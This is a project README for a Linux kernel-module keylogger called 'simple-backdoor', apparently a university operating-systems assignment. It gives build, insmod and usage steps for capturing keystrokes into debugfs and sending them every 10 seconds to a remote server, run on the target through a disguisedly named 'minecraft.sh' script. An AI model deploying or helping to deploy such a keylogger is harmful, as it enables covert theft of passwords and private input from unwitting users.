# simple-backdoor

A kernel module that captures key pressed from the keyboard and saves them to a file, using the ```debufgs``` library. This file is sent via socket every 10 seconds to a server, also present in this repository.

Using debugfs the backdoor is only available for as long as the computer remains on. Once turned off, the file will be immediately deleted. That's why, the file is stored in the ```/sys/kernel/debug/``` folder that only stores in RAM memory.

Another observation is regarding the connection via socket. The connection is only established for computers on the same network.

**DISCLAIMER:** this repository is a graduation work of the discipline of operating systems and has no unethical purposes.

## Table of contents
- [simple-backdoor](#simple-backdoor)
  - [Table of contents](#table-of-contents)
  - [Compilation](#compilation)
    - [Build](#build)
  - [Usage](#usage)
  - [License](#license)
  - [Developer](#developer)

## Compilation
### Build
Clone the repository 

    # git clone https://github.com/MichelH4cker/simple-backdoor

and compile the kernel module with

    # make

Note that you need to have the linux kernel headers installed for your running kernel version.

To insert the module into the kernel, run:

    # insmod kisni.ko
    OR
    # make load

To unload the module (and clear the logs), run:

    # rmmod kisni

To run the python programs just do
    
    # python3 server.py ip port

and

    # python3 client.py

where ip is the IP's server and port is the server port.

## Usage

The correct mode of use happens as follows. First, you need to run the server on a remote computer. This server will be waiting for the connection of the client which, in this case, is the target computer of the backdoor. So, in a computer, run

    # python3 server.py ip port

where ip it's the ip of ther server and port is the port of the server.

Now, for the backdoored computer, things are a bit more difficult. First, you need to enter the client code (```client.py```) and write the IP address and port of the server so that the connection takes place perfectly. Second, at this time, this project does not yet address a practical way to run the program on another computer other than manually. Then go to the target computer and run the bash script as follows

    # sudo ./minecraft.sh

Note that you also need to know the admin password 😢. When the script is executed, the client will connect to the server and start uploading the keylogger. The sending will happen every 10 seconds and in the server terminal it is possible to see the strings received from the backdoor.

If you still have access to the target machine you can verify the file manually by typing the following command in the terminal

    # sudo cat /sys/kernel/debug/backdoor/keylogger

To check the module details:

```
# modinfo backdoor.ko
filename:       backdoor.ko
description:    A simple backdoor with keylogger to debugfs
author:         Michel Hecker Faria
license:        GPL
srcversion:     97D6507873340678492BA80
depends:
retpoline:      Y
name:           backdoor
vermagic:       5.17.5-76051705-generic SMP preempt mod_unload modversions
```

## License
<a href="https://github.com/jarun/googler/blob/master/LICENSE"><img src="https://img.shields.io/badge/license-GPLv2-yellow.svg?maxAge=2592000" alt="License" /></a>

## Developer
Copyright © 2023 [Michel Hecker Faria](mailto:michel.hecker@usp.br)
